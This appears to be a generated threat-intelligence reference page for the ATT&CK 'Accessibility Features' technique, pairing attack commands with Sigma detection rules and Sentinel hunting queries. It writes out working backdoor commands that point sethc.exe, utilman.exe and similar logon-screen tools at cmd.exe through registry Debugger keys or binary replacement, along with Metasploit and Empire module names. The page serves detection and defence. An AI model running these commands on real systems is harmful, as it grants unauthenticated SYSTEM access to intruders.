
# Accessibility Features

## Description

### MITRE Description

> Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.

Two common accessibility programs are <code>C:\Windows\System32\sethc.exe</code>, launched when the shift key is pressed five times and <code>C:\Windows\System32\utilman.exe</code>, launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as "sticky keys", and has been used by adversaries for unauthenticated access through a remote desktop login screen. (Citation: FireEye Hikit Rootkit)

Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in <code>%systemdir%\</code>, and it must be protected by Windows File or Resource Protection (WFP/WRP). (Citation: DEFCON2016 Sticky Keys) The [Image File Execution Options Injection](https://attack.mitre.org/techniques/T1546/012) debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.

For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g., <code>C:\Windows\System32\utilman.exe</code>) may be replaced with "cmd.exe" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over [Remote Desktop Protocol](https://attack.mitre.org/techniques/T1021/001) will cause the replaced file to be executed with SYSTEM privileges. (Citation: Tilbury 2014)

Other accessibility features exist that may also be leveraged in a similar fashion: (Citation: DEFCON2016 Sticky Keys)(Citation: Narrator Accessibility Abuse)

* On-Screen Keyboard: <code>C:\Windows\System32\osk.exe</code>
* Magnifier: <code>C:\Windows\System32\Magnify.exe</code>
* Narrator: <code>C:\Windows\System32\Narrator.exe</code>
* Display Switcher: <code>C:\Windows\System32\DisplaySwitch.exe</code>
* App Switcher: <code>C:\Windows\System32\AtBroker.exe</code>

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: ['SYSTEM']
* Network: None
* Permissions: ['Administrator']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1546/008

## Potential Commands

```
Sticky Keys Persistence via Registry Manipulations:
shell REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
Sticky Keys Persistence via Registry Manipulations:
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
post/windows/manage/sticky_keys
Sticky Keys Persistence via binary swapping:
shell takeown.exe C:\Windows\system32\sethc.exe
shell del C:\Windows\system32\sethc.exe
shell copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe
Sticky Keys Persistence via binary swapping:
takeown.exe C:\Windows\system32\sethc.exe
del C:\Windows\system32\sethc.exe
copy C:\Windows\system32\cmd.exe C:\Windows\system32\sethc.exe
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe /v "Debugger" /t REG_SZ /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\magnify.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\narrator.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
cmd.exe reg add
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\DisplaySwitch.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
HKLM\Software\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\AtBroker.exe /t REG_SZ /v Debugger /d "C:\windows\system32\cmd.exe" /f
cmd.exe reg add
powershell/lateral_movement/invoke_wmi_debugger
powershell/persistence/misc/debugger
```

## Commands Dataset

```
[{'command': 'Sticky Keys Persistence via Registry Manipulations:\n'
             'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v '
             'Debugger /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Sticky Keys Persistence via Registry Manipulations:\n'
             'shell REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows '
             'NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /v '
             'Debugger /t REG_SZ /d "C:\\windows\\system32\\cmd.exe" /f',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'post/windows/manage/sticky_keys',
  'name': 'Metasploit',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Sticky Keys Persistence via binary swapping:\n'
             'takeown.exe C:\\Windows\\system32\\sethc.exe\n'
             'del C:\\Windows\\system32\\sethc.exe\n'
             'copy C:\\Windows\\system32\\cmd.exe '
             'C:\\Windows\\system32\\sethc.exe',
  'name': 'Built-in Windows Command',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'Sticky Keys Persistence via binary swapping:\n'
             'shell takeown.exe C:\\Windows\\system32\\sethc.exe\n'
             'shell del C:\\Windows\\system32\\sethc.exe\n'
             'shell copy C:\\Windows\\system32\\cmd.exe '
             'C:\\Windows\\system32\\sethc.exe',
  'name': 'Cobalt Strike',
  'source': 'https://attack.mitre.org/docs/APT3_Adversary_Emulation_Field_Manual.xlsx'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\osk.exe /v "Debugger" /t REG_SZ /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\sethc.exe /t REG_SZ /v Debugger /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\utilman.exe /t REG_SZ /v Debugger /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\magnify.exe /t REG_SZ /v Debugger /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\narrator.exe /t REG_SZ /v Debugger /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\DisplaySwitch.exe /t REG_SZ /v Debugger '
             '/d "C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'cmd.exe reg add',
  'name': None,
  'source': 'Threat Hunting Tables'},
 {'command': 'HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Image '
             'File Execution Options\\AtBroker.exe /t REG_SZ /v Debugger /d '
             '"C:\\windows\\system32\\cmd.exe" /f',
  'name': 'registry_path',
  'source': 'Threat Hunting Tables'},
 {'command': 'powershell/lateral_movement/invoke_wmi_debugger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/lateral_movement/invoke_wmi_debugger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/misc/debugger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'},
 {'command': 'powershell/persistence/misc/debugger',
  'name': 'Empire Module Command',
  'source': 'https://github.com/dstepanic/attck_empire/blob/master/Empire_modules.xlsx?raw=true'}]
```

## Potential Detections

```json
[{'data_source': {'action': 'global',
                  'author': 'Florian Roth, @twjackomo',
                  'date': '2018/03/15',
                  'description': 'Detects the usage and installation of a '
                                 'backdoor that uses an option to register a '
                                 'malicious debugger for built-in tools that '
                                 'are accessible in the login screen',
                  'detection': {'condition': '1 of them'},
                  'falsepositives': ['Unlikely'],
                  'id': 'baca5663-583c-45f9-b5dc-ea96a22ce542',
                  'level': 'critical',
                  'references': ['https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/'],
                  'tags': ['attack.privilege_escalation',
                           'attack.persistence',
                           'attack.t1015',
                           'car.2014-11-003',
                           'car.2014-11-008'],
                  'title': 'Sticky Key Like Backdoor Usage'}},
 {'data_source': {'detection': {'selection_registry': {'EventID': 13,
                                                       'EventType': 'SetValue',
                                                       'TargetObject': ['*\\SOFTWARE\\Microsoft\\Windows '
                                                                        'NT\\CurrentVersion\\Image '
                                                                        'File '
                                                                        'Execution '
                                                                        'Options\\sethc.exe\\Debugger',
                                                                        '*\\SOFTWARE\\Microsoft\\Windows '
                                                                        'NT\\CurrentVersion\\Image '
                                                                        'File '
                                                                        'Execution '
                                                                        'Options\\utilman.exe\\Debugger',
                                                                        '*\\SOFTWARE\\Microsoft\\Windows '
                                                                        'NT\\CurrentVersion\\Image '
                                                                        'File '
                                                                        'Execution '
                                                                        'Options\\osk.exe\\Debugger',
                                                                        '*\\SOFTWARE\\Microsoft\\Windows '
                                                                        'NT\\CurrentVersion\\Image '
                                                                        'File '
                                                                        'Execution '
                                                                        'Options\\Magnify.exe\\Debugger',
                                                                        '*\\SOFTWARE\\Microsoft\\Windows '
                                                                        'NT\\CurrentVersion\\Image '
                                                                        'File '
                                                                        'Execution '
                                                                        'Options\\Narrator.exe\\Debugger',
                                                                        '*\\SOFTWARE\\Microsoft\\Windows '
                                                                        'NT\\CurrentVersion\\Image '
                                                                        'File '
                                                                        'Execution '
                                                                        'Options\\DisplaySwitch.exe\\Debugger']}},
                  'logsource': {'product': 'windows', 'service': 'sysmon'}}},
 {'data_source': {'detection': {'selection_process': {'CommandLine': ['*cmd.exe '
                                                                      'sethc.exe '
                                                                      '*',
                                                                      '*cmd.exe '
                                                                      'utilman.exe '
                                                                      '*',
                                                                      '*cmd.exe '
                                                                      'osk.exe '
                                                                      '*',
                                                                      '*cmd.exe '
                                                                      'Magnify.exe '
                                                                      '*',
                                                                      '*cmd.exe '
                                                                      'Narrator.exe '
                                                                      '*',
                                                                      '*cmd.exe '
                                                                      'DisplaySwitch.exe '
                                                                      '*'],
                                                      'ParentImage': ['*\\winlogon.exe']}},
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'}}},
 {'data_source': {'author': 'Florian Roth',
                  'date': '2019/09/06',
                  'description': 'Detects the registration of a debugger for a '
                                 'program that is available in the logon '
                                 'screen (sticky key backdoor).',
                  'detection': {'condition': 'selection',
                                'selection': {'CommandLine': ['*\\CurrentVersion\\Image '
                                                              'File Execution '
                                                              'Options\\sethc.exe*',
                                                              '*\\CurrentVersion\\Image '
                                                              'File Execution '
                                                              'Options\\utilman.exe*',
                                                              '*\\CurrentVersion\\Image '
                                                              'File Execution '
                                                              'Options\\osk.exe*',
                                                              '*\\CurrentVersion\\Image '
                                                              'File Execution '
                                                              'Options\\magnify.exe*',
                                                              '*\\CurrentVersion\\Image '
                                                              'File Execution '
                                                              'Options\\narrator.exe*',
                                                              '*\\CurrentVersion\\Image '
                                                              'File Execution '
                                                              'Options\\displayswitch.exe*']}},
                  'falsepositives': ['Penetration Tests'],
                  'id': 'ae215552-081e-44c7-805f-be16f975c8a2',
                  'level': 'high',
                  'logsource': {'category': 'process_creation',
                                'product': 'windows'},
                  'references': ['https://blogs.technet.microsoft.com/jonathantrull/2016/10/03/detecting-sticky-key-backdoors/'],
                  'status': 'experimental',
                  'tags': ['attack.persistence',
                           'attack.privilege_escalation',
                           'attack.t1015'],
                  'title': 'Suspicious Debugger Registration Cmdline'}},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['AutoRuns']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['LOG-MD', 'AutoRuns']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['4663', 'File monitoring']}]
```

## Potential Queries

```json
[{'name': 'Accessibility Features',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where EventID == 1 and process_parent_path '
           'contains"winlogon.exe"and (process_path contains "sethc.exe"or '
           'process_path contains "utilman.exe"or process_path contains '
           '"osk.exe"or process_path contains "magnify.exe"or process_path '
           'contains "displayswitch.exe"or process_path contains '
           '"narrator.exe"or process_path contains "atbroker.exe")'},
 {'name': 'Accessibility Features Registry',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14) '
           'and registry_key_path contains '
           '"HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows '
           'NT\\\\CurrentVersion\\\\Image File Execution Options\\\\*"'}]
```

## Raw Dataset

```json
[{'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Sticky '
                                                                              'Keys '
                                                                              'Persistence '
                                                                              'via '
                                                                              'Registry '
                                                                              'Manipulations:\n'
                                                                              'REG '
                                                                              'ADD '
                                                                              '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                              'NT\\CurrentVersion\\Image '
                                                                              'File '
                                                                              'Execution '
                                                                              'Options\\sethc.exe" '
                                                                              '/v '
                                                                              'Debugger '
                                                                              '/t '
                                                                              'REG_SZ '
                                                                              '/d '
                                                                              '"C:\\windows\\system32\\cmd.exe" '
                                                                              '/f',
                                                  'Category': 'T1015',
                                                  'Cobalt Strike': 'Sticky '
                                                                   'Keys '
                                                                   'Persistence '
                                                                   'via '
                                                                   'Registry '
                                                                   'Manipulations:\n'
                                                                   'shell REG '
                                                                   'ADD '
                                                                   '"HKLM\\SOFTWARE\\Microsoft\\Windows '
                                                                   'NT\\CurrentVersion\\Image '
                                                                   'File '
                                                                   'Execution '
                                                                   'Options\\sethc.exe" '
                                                                   '/v '
                                                                   'Debugger '
                                                                   '/t REG_SZ '
                                                                   '/d '
                                                                   '"C:\\windows\\system32\\cmd.exe" '
                                                                   '/f',
                                                  'Description': 'Modify the '
                                                                 'registry to '
                                                                 'point the '
                                                                 'sethc.exe '
                                                                 'file to '
                                                                 'point to '
                                                                 'cmd.exe',
                                                  'Metasploit': 'post/windows/manage/sticky_keys'}},
 {'Mitre APT3 Adversary Emulation Field Manual': {'Built-in Windows Command': 'Sticky '
                                                                              'Keys '
                                                                              'Persistence '
                                                                              'via '
                                                                              'binary '
                                                                              'swapping:\n'
                                                                              'takeown.exe '
                                                                              'C:\\Windows\\system32\\sethc.exe\n'
                                                                              'del '
                                                                              'C:\\Windows\\system32\\sethc.exe\n'
                                                                              'copy '
                                                                              'C:\\Windows\\system32\\cmd.exe '
                                                                              'C:\\Windows\\system32\\sethc.exe',
                                                  'Category': 'T1015',
                                                  'Cobalt Strike': 'Sticky '
                                                                   'Keys '
                                                                   'Persistence '
                                                                   'via binary '
                                                                   'swapping:\n'
                                                                   'shell '
                                                                   'takeown.exe '
                                                                   'C:\\Windows\\system32\\sethc.exe\n'
                                                                   'shell del '
                                                                   'C:\\Windows\\system32\\sethc.exe\n'
                                                                   'shell copy '
                                                                   'C:\\Windows\\system32\\cmd.exe '
                                                                   'C:\\Windows\\system32\\sethc.exe',
                                                  'Description': 'Remove the '
                                                                 'real '
                                                                 'sethc.exe '
                                                                 'and replace '
                                                                 'it with a '
                                                                 'copy of '
                                                                 'cmd.exe. You '
                                                                 'can also '
                                                                 'just move '
                                                                 'the original '
                                                                 'sethc.exe to '
                                                                 'a different '
                                                                 'file if you '
                                                                 "don't want "
                                                                 'to delete it',
                                                  'Metasploit': ''}},
 {'Threat Hunting Tables': {'chain_id': '100175',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\osk.exe /v '
                                             '"Debugger" /t REG_SZ /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100176',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\sethc.exe /t '
                                             'REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100177',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\utilman.exe '
                                             '/t REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100178',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\magnify.exe '
                                             '/t REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100179',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\narrator.exe '
                                             '/t REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100180',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution '
                                             'Options\\DisplaySwitch.exe /t '
                                             'REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Threat Hunting Tables': {'chain_id': '100181',
                            'commandline_string': 'reg add',
                            'file_path': '',
                            'file_value': '',
                            'frequency': 'rare',
                            'itw_sample': '',
                            'loaded_dll': '',
                            'mitre_attack': 'T1015',
                            'mitre_caption': 'accessibity_features',
                            'os': 'windows',
                            'parent_process': 'cmd.exe',
                            'registry_path': 'HKLM\\Software\\Microsoft\\Windows '
                                             'NT\\CurrentVersion\\Image File '
                                             'Execution Options\\AtBroker.exe '
                                             '/t REG_SZ /v Debugger /d '
                                             '"C:\\windows\\system32\\cmd.exe" '
                                             '/f',
                            'registry_value': '',
                            'sub_process_1': '',
                            'sub_process_2': ''}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1015',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/lateral_movement/invoke_wmi_debugger":  '
                                                                                 '["T1015"],',
                                            'Empire Module': 'powershell/lateral_movement/invoke_wmi_debugger',
                                            'Technique': 'Accessibility '
                                                         'Features'}},
 {'Empire Module XLSX Sheet by dstepanic': {'ATT&CK Technique #1': 'T1015',
                                            'ATT&CK Technique #2': '',
                                            'Concatenate for Python Dictionary': '"powershell/persistence/misc/debugger":  '
                                                                                 '["T1015"],',
                                            'Empire Module': 'powershell/persistence/misc/debugger',
                                            'Technique': 'Accessibility '
                                                         'Features'}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)

* [Privilege Escalation](../tactics/Privilege-Escalation.md)
    

# Mitigations


* [Operating System Configuration](../mitigations/Operating-System-Configuration.md)

* [Limit Access to Resource Over Network](../mitigations/Limit-Access-to-Resource-Over-Network.md)
    
* [Execution Prevention](../mitigations/Execution-Prevention.md)
    

# Actors


* [APT3](../actors/APT3.md)

* [APT29](../actors/APT29.md)
    
* [Deep Panda](../actors/Deep-Panda.md)
    
* [Axiom](../actors/Axiom.md)
    
* [APT41](../actors/APT41.md)
    
